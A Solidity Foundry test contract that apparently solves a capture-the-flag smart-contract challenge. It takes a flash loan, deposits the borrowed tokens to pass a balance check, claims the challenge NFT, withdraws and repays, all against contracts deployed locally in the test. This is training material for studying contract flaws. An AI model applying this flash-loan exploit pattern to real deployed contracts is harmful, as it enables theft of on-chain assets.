// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { Test, console2 } from "forge-std/Test.sol";
import { S6 } from "../../src/section-6-nft/src/challenges/S6.sol";
import { S6Token } from "../../src/section-6-nft/src/challenges/S6Token.sol";
import { S6Market } from "../../src/section-6-nft/src/challenges/S6Market.sol";
import { IFlashLoanReceiver } from "../../src/section-6-nft/src/interfaces/IFlashLoanReceiver.sol";
import { SafeERC20 } from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import { IERC721 } from "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import { IERC721Receiver } from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract S6FlashLoanExploit is Test, IFlashLoanReceiver {
    using SafeERC20 for S6Token;

    error NotOwner();

    S6 private s6;
    S6Token private s6Token;
    S6Market private s6Market;
    address private controller;

    function setUp() public {
        controller = msg.sender;
        // Deploy the contracts
        s6 = new S6(address(this));
        s6Token = S6Token(s6.getToken());
        s6Market = S6Market(s6.getMarket());
    }

    function testSolveS6Challenge() public {
        // Start the flash loan
        s6Market.flashLoan(2000000e18);
        // If we reach this point, the challenge is solved
        console2.log("Section 6 contract exploited!");
    }

    function execute() external payable {
        // Approve the S6 contract to spend the tokens
        s6Token.approve(address(s6), 2000000e18);
        // Deposit the tokens
        s6.depositMoney(2000000e18);
        // Solve the challenge
        s6.solveChallenge("");
        // Withdraw the tokens after getting the NFTÂº
        s6.withdrawMoney();
        // Repay the flash loan
        s6Token.safeTransfer(msg.sender, s6Token.balanceOf(address(this)));
    }

    function owner() external view returns (address) {
        return address(this);
    }

    function withdrawNft(address nft, uint256 tokenId, address to) external {
        if (msg.sender != controller) revert NotOwner();
        IERC721(nft).safeTransferFrom(address(this), to, tokenId);
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}